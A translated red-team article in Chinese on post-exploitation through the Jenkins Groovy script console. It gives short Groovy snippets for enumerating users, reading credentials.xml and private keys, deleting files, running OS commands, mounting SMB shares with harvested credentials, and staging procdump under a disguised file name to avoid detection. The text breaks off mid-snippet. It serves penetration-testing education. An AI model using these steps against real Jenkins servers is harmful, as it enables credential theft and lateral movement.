本文为翻译文章，原文链接为：
## 前言
Jenkins是一个配备有以持续集成为目的的各类插件的Java编写的开源的自动化工具，可以用于持续开发和测试的软件项目，是开发人员能够将更新集成到项目中，并使得用户获得一个新鲜的发布版软件。Jenkins有一个很不错的Groovy脚本console口，允许在Jekins运行时在客户端代理上执行任意Groovy脚本。它还包括一个管道插件，允许使用Groovy编写构建指令。
## 什么是Groovy？
Groovy是一个兼容JAVA语法的面向对象的为JAVA平台服务的编程语言。它既是静态语言又是动态语言，有着和Python，Ruby，Perl和Smaltalk类似功能的语言。它既可以被用作编程语言，也可以作为JAVA平台的脚本语言。
近几个月我们做了很多针对Jenkins或包含Jekins的集成环境的渗透测试和红队练习。这些活动基本都是通过Groovy脚本分发自动化任务来实施的。网上好像没有很多讨论这个话题的资源，我们决定创建一个包含如何将这种脚本语言好好利用的白皮书。
尽管Groovy脚本console在攻击者手下是很厉害的攻击，但是这个白皮书不会覆盖所有的攻陷Jenkins和这个console口的方法的技术点。我们将假设已经获得console口的权限来进行测试。
大多数这种测试都是基于Windows环境。除了特定命令外，其他基本你都可以在Linux或者其他操作系统下执行相同的Groovy脚本。
## Groovy基础
### 列出文件和文件夹
当Jenkins被攻击，在侦查阶段，识别沦陷系统是非常重要的。通过Groovy可以很简单找到Jenkins的root目录。
    dir = new File(“..\\..\\”)
    dir.eachFile {
    println it
    }
console口显示了脚本的输出：
双引号中间的脚本代码可以准确识别任何文件名。
在下列例子中，Jenkins下的子文件夹“users"都可以输出中打印出来，可以用来枚举目标Jenkins的本地用户。
    dir = new File("../../Jenkins/home3/users")
    dir.eachFile {
    println it
    }
输出：
    ..\..\Jenkins\home3\users\admin
    ..\..\Jenkins\home3\users\user1
    ..\..\Jenkins\home3\users\user2
    ..\..\Jenkins\home3\users\user3
    [...]
### 打印环境变量
环境变量通过如下的脚本片段就可以打印出来：
    def env = System.getenv()
    println “${env}”
### 删除一个文件
一个文件可以通过如下两行Groovy脚本就删除了：
    deleteme = new File('C:\\target\filename.exe')
    deleteme.delete()
### 创建文件
文件系统中国一个空文件可以通过如下Groovy脚本创建：
    createme = new File(“C:\\target\filename.exe”)
    createme.createNewFile()
创建一个空文件好像很奇怪，但是在渗透测试中用于检查用户在Jenkins的web根目录下是否可写的权限是很方便的。在接下来的例子中，成功尝试在”Jenkins/home3/userContent/"文件夹下创建一个空文件“test.txt"。true的结果表明我们可以向该目录写文件。
### 读文件
一个文件可以通过如下单行脚本读取：
    String fileContents = new File('C:\\USERS\\username\\desktop\\something.conf').text
这个代码作用很大。首先，一个渗透测试人员可以去读取Jenkins的“credentials.xml"资源，这里面会有用户名，密码和私钥。
在测试期间有几种情况下，我们还设法从Jenkins访问的存储库中收集与应用程序代码相关的明文凭证：
通过测试Jenkins的构建版，对于渗透测试人员和读取团队成员来说，发现配置的git存储库并使用收集的密钥/凭证横向移动到目标基础架构中是一个很好玩的事。
在很多案例中，只是枚举本地文件夹和读文件我们就可以在目标体系中横向移动了，并且可以尽可能地获取最大的权限。下面的例子中我们是从文件系统中的“c:\ssh”目录开始。文件目录列举可以看到有个叫“run.sh”的脚本，只是用来以root用户连接一个特定主机。很明显这个脚本用得是存储在文件系统中的私钥来进行无密登陆。
通常来说接下来就是在文件系统中找到私钥。
一旦找到私钥（图中的oracle.key），接下来就是登陆远程系统。
### 执行命令
执行操作系统命令和刚刚说的创建删除文件一样简单，都可以通过一行Groovy脚本解决。下面的例子就是执行了“whoami”的命令：
    println "whoami".execute().text
输出如下：
    Result: [machine\user]
特别的是，我们在Windows系统上执行“systeminfo”可以帮助我们了解系统信息等：
    println "systeminfo".execute().text
除了这两个命令任何命令基本都可以这么用。
### 加载共享盘
在一个攻陷主机加载一个远程共享盘可能没什么大问题，但是看一下做这件事的动机就知道这很重要。
我们来假设通过bat脚本从文件系统下载资源：
    net use P: \\192.168.1.42\ShareName /user:MACHINE\user MountPassword
    cd "C:\stack"
    set HOME=%USERPROFILE%
    echo %date% %time%
    "P:\Internal_Tools\Portable Software Stack\Git\bin\git.exe" clean –f
    [...]
这种情况下192.168.1.42是一个和Jenkins主机同一个子网下的共享服务器，bat脚本中发现用了SMB共享的凭据信息，也就是说可以在Groovy脚本中运行“net
use P:\192.168.1.43\Sharename /user:MACHINE\user
MountPassword”这个命令，攻击者可以加载网络文件夹到本地磁盘下。
希望如果这样获得的凭据提供对远程共享中的一个或多个子文件夹的写访问权限，则攻击者可以将该共享用作临时服务器，其中存储命令输出或后门以从受感染的主机运行。
这将使攻击者处于更好的状态，在不触发防御警告的情况下传输自己想要用的工具。
### 复制和移动文件
现在在攻陷后Jenkins主机下有一个加载好的共享文件夹“P:\”，如果攻击者想要移动“procdump64.exe”文件到Jenkins服务器的文件系统上呢？下面3行Groovy代码可以帮助到我们：
    src = new File("P:\\tools\\procdump64.exe")
    dest = new File("C:\\users\\username\\jenkins-monitor.exe")
    dest 
访问我们的博客  和推特
 。